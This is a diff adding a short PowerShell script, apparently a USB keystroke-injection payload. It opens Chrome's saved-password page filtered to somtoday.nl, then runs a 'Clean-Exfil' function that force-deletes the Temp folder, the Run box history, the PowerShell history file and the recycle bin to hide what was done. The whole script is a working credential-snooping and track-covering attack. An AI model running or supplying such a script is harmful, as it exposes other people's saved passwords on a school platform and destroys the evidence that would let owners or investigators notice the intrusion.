@@ -1,0 +1,27 @@
+
+# Define the URL
+$url = "chrome://password-manager/passwords?q=somtoday.nl"
+
+# Open the URL in the default web browser
+Start-Process $url
+
+# Function to clean up
+function Clean-Exfil {
+    # Delete contents of Temp folder
+    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+    # Delete run box history
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
+
+    # Delete PowerShell history (PSReadline history)
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+
+    # Empty the recycle bin
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+}
+
+# Call the cleanup function
+Clean-Exfil
+
+# Exit the script
+exit
